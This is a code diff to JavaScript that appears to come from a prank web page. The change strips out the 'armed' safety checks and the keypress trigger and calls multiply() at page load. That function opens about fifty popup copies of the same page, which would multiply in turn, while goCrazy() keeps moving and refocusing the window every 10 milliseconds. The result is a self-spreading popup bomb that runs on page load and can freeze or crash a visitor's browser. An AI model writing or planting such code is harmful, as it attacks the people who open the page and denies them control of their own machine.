@@ -10,30 +10,73 @@ document.addEventListener("keypress", function(event) {
     alert("Disarmed");
 		armed = false;
   }
-  //if key pressed = 4
-  if (event.keyCode == 52) {
-    multiply();
-  }
 })
+
+multiply();
 
 function openWindow(url){
         aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=320,height=240,titlebar=no,alwaysRaised=yes');
 }
 
 function multiply(){
-  if(armed){
 	  openWindow('index.html');
 	  openWindow('index.html');
 	  openWindow('index.html');
 	  openWindow('index.html');
 	  openWindow('index.html');
 	  openWindow('index.html');
-    alert("You are an idiot");
-	}
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+	  openWindow('index.html');
+
 }
 
 function goCrazy() {
-  if(armed){
     window.focus();   
     xPos = xPos + xOff;
     yPos = yPos + yOff;
@@ -51,6 +94,5 @@ function goCrazy() {
       yOff = Math.ceil( 7 * Math.random())  * 5 - 10;
     }
     window.moveTo(xPos,yPos);
-		setTimeout('goCrazy();',10);
-	}	
+		setTimeout('goCrazy();',10);	
 }
